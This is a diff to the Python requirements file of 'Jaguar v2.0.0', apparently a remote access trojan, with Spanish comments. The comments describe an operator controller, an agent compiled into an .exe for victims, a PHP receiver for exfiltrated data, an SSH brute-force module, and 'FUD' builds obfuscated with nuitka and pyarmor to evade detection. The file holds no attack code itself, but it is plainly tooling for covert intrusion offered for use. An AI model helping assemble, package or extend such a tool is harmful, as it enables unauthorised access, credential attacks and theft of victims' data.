@@ -1,19 +1,41 @@
-# --- Controlador (máquina del operador) --- C:\Users\personal\JaguarRat\img
-# --- Controlador (máquina del operador) ---
+# ============================================================================
+#  Jaguar v2.0.0 — requirements del CONTROLADOR (tu máquina de operador)
+#  El AGENTE (agente.py) no requiere nada de aquí: es autocontenido
+#  (stdlib + PIL/cv2 opcionales, que ya van embebidos en el .exe del builder).
+#  El receptor de exfiltración es PHP, no pip.
+#
+#  Instalación:
+#     python -m venv .venv
+#     .venv\Scripts\activate
+#     pip install -r requirements.txt
+# ============================================================================
+
+# --- Controlador (UI / red / escáner / geo) ---
 PyQt6>=6.6
 requests>=2.31
 msgpack>=1.0
 psutil>=5.9
 
-# --- Builder / empaquetado ---
+# --- Explotadores nativos ---
+# NUEVO: explotadores.explotar_ssh() ya lo importaba pero faltaba aquí.
+# Sin esto, el módulo devuelve "paramiko no instalado" en vez de hacer el brute-force.
+paramiko>=3.4
+
+# --- Builder / empaquetado del payload ---
 pyinstaller>=6.12
 pillow>=10.0
 opencv-python>=4.8
 numpy>=1.26
 pywin32>=306 ; sys_platform == "win32"
 
-# --- FUD (build avanzado) ---
+# --- Build avanzado (FUD / ofuscación) ---
 nuitka>=2.4
 ordered-set>=4.1
 zstandard>=0.22
 pyarmor>=9.0
+
+# --- Opcional: acelerador criptográfico ---
+# El agente usa AES/3DES en Python puro para no depender de nada en la víctima.
+# Si además quieres 'cryptography' en el controlador (scripts propios, tests),
+# descomenta. Es OPCIONAL: nada del flujo depende de ello.
+cryptography>=42.0
